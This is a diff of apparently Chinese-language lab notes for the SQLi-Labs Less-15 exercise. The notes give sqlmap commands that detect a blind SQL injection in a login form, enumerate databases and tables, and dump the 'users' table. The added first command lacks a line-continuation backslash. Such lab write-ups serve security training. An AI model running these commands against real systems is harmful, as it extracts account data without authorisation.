@@ -42,13 +42,24 @@
 ---
 直接上sqlmap
 
-sqlmap -u "ip/Less-15/" \
-  --data="uname=admin&passwd=admin" \
-  --batch --dbms=mysql --technique=B --threads=5 \
-  --string="flag.jpg" --level=5 #判断注入类型
+sqlmap -u "ip/Less-15/" --data="uname=admin&passwd=admin" 
+  --batch --dbms=mysql --technique=B --threads=5  --string="flag.jpg" --level=5 #判断注入类型
 
 ![](assets/Less-15/file-20260530224116744.png)
 
-sqlmap -u "http://10.3.187.26:8848/Less-15/" 
-  --data="uname=admin&passwd=admin" 
+# 爆库
+sqlmap -u "ip/Less-15" \
+  --data="uname=admin&passwd=admin" \
   --batch --dbs --threads=5 --string="flag.jpg"
+
+# 爆 security 库的表
+sqlmap -u "ip/Less-15/" \
+  --data="uname=admin&passwd=admin" \
+  --batch -D security --tables --threads=5 --string="flag.jpg"
+
+# 爆 users 表数据
+sqlmap -u "ip/Less-15" \
+  --data="uname=admin&passwd=admin" \
+  --batch -D security -T users --dump --threads=5 --string="flag.jpg"
+
+![](assets/Less-15/file-20260530224512440.png)
